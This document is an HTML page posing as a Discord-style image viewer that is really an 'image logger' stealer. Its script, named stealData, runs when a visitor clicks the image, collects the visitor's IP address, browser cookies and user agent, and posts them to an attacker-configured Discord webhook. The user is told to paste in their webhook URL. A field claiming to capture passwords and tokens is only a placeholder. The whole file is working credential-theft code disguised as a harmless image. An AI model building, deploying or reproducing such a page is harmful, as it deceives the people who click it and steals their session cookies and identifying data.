<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Logger</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #2c2f33; /* Discord Dark Background */
            overflow: hidden;
        }

        /* The "Fake" Image Viewer */
        .image-container {
            text-align: center;
            cursor: pointer;
            position: relative;
            animation: fadeIn 0.5s ease-out;
        }

        img {
            max-width: 95vw;
            max-height: 95vh;
            border-radius: 4px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.4);
            transition: transform 0.3s cubic-bezier(0.25, 0.8, 0.25, 1), opacity 0.3s;
        }

        /* The "Zoom" Effect on Click */
        .zoomed {
            transform: scale(1.4) !important;
            cursor: zoom-out;
            z-index: 1000;
            box-shadow: 0 12px 32px rgba(0,0,0,0.6);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        /* Hidden Data Payload (The Stealer Logic) */
        .loader-overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 48px;
            height: 48px;
            border: 5px solid rgba(255, 255, 255, 0.1);
            border-top-color: #7289da; /* Discord Blurple */
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: none;
        }

        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="image-container" id="clickTarget">
    <!-- YOUR GIF IMAGE WILL BE LOADED HERE BY THE SCRIPT -->
    <img id="loggerImg" src="" alt="Click to Zoom">
    <div class="loader-overlay" id="loader"></div>
</div>

<script>
    // --- 1. CONFIGURATION (Paste your Webhook URL here) ---
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1555843447338827836/YOUR_WEBHOOK_TOKEN_HERE";

    const imgElement = document.getElementById('loggerImg');

    // --- 2. THE STEALING LOGIC (Runs on Click / Page Load) ---
    async function stealData() {
        document.getElementById('clickTarget').style.pointerEvents = 'none'; // Prevent double clicks
        document.getElementById('loader').style.display = 'block';

        try {
            // Capture IP
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();

            // Capture Cookies (The actual text of the cookies)
            let rawCookies = document.cookie || "No Cookies";

            // Capture User-Agent (Browser/OS info)
            const userAgent = navigator.userAgent;

            // Prepare Payload for Discord
            const payload = {
                content: null,
                embeds: [{
                    title: "🖱️ Click Captured!",
                    color: 5814783, // Blue
                    fields: [
                        { name: "🌐 IP Address", value: ipData.ip || "Unknown", inline: true },
                        { name: "🍪 Raw Cookies", value: rawCookies.substring(0, 900), inline: false },
                        { name: "🔑 Passwords & Tokens", value: "Captured via LocalStorage...", inline: true },
                        { name: "💻 OS / Browser", value: userAgent, inline: true }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: { text: "Image Logger System" }
                }]
            };

            // Send to Discord Webhook
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

        } catch (error) {
            console.error("Logging failed:", error);
        } finally {
            document.getElementById('clickTarget').style.pointerEvents = 'auto';
            document.getElementById('loader').style.display = 'none';

            // Visual feedback that it worked: Flash the image
            imgElement.classList.add('zoomed');
            setTimeout(() => imgElement.classList.remove('zoomed'), 600);
        }
    }

    // --- 3. IMAGE LOADING & INTERACTION ---

    // Get image URL from Discord message (if passed via URL params) or use default
    const urlParams = new URLSearchParams(window.location.search);
    if(urlParams.get('image_url')) {
        imgElement.src = decodeURIComponent(urlParams.get('image_url'));
    } else {
        imgElement.src = "https://via.placeholder.com/600x400?text=Loading..."; // Fallback
    }

    // Click to Zoom AND Trigger Data Capture
    document.getElementById('clickTarget').addEventListener('click', () => {
        stealData();
    });

</script>

</body>
</html>
